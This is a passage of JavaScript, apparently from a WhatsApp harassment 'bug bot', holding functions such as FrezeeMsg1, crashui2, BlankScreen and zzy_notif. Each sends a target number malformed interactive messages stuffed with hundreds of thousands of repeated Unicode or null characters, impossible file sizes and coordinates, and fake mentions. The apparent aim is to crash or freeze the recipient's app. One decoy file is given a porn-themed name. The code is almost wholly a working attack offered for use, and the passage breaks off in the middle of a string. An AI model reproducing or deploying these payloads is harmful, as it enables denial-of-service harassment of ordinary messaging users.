        Ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.magenta.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));
    } 
  
    //===========================//
       // FUNC BUG LUBYZ
 async function FrezeeMsg1(target) {
            let virtex = "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫";

            lubyz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RuzxxHere" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
     console.log(chalk.white.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));
        }
    
  //===========================\\  
         // FUNC BUG LUBYZ
 async function FrezeeMsg2(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩⿻";
            let memekz = Date.now();

            await lubyz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
  console.log(chalk.red.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));   
        };
 
 //===============================///
    // FUNC BUG LUBYZ
    async function crashui2(nomor, ptcp = true) {
    await lubyz.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫" + "ꦾ".repeat(200000) + "@1".repeat(150000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
       console.log(chalk.yellow.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));
}
  
    
// ===============================//
       // FUNC BUG LUBYZ
async function BlankScreen(target, Ptcp = true) {
        let virtex = "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫" + "\u0000".repeat(200000);
			await lubyz.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "ZynXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : { quoted: m }
			);
   console.log(chalk.green.bold("𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫"));
       }
  
  //===============================\\  
         //FUNC BUG LUBYZ
//LUBYZ V1.5   
async function zzy_notif(target) {
			await lubyz.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "\u0000" + "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴